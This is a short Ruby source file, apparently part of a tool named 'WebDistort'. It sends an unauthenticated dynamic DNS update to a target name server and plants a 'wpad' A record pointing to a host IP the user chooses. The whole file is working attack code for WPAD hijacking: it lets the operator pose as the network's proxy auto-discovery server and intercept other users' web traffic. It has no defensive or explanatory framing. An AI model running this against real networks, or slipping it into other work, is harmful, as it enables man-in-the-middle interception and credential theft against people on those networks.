#!/usr/bin/ruby
#

class WebDistort
	
	class DNS
		@domain = ''
		@host_ip = ''
		@target_name_server = ''

		def initialize(wpad_domain, target_server, host_ip)
			@domain = wpad_domain
			@target_name_server = target_server
			@host_ip = host_ip
		end

		def update

			dns_update = Dnsruby::Update.new(@domain)
	
			host = 'wpad.' + @domain

			dns_update.absent(host, 'A')
	
			dns_update.add(host, 'A', 86400, @host_ip)

			dns_resolver = Dnsruby::Resolver.new(:nameserver => @target_name_server)

			begin
				response = dns_resolver.send_message(dns_update)
				print 'WPAD address created'
				rescue Exception => e
					print 'Error: ' + e
			end
		end

        end

end

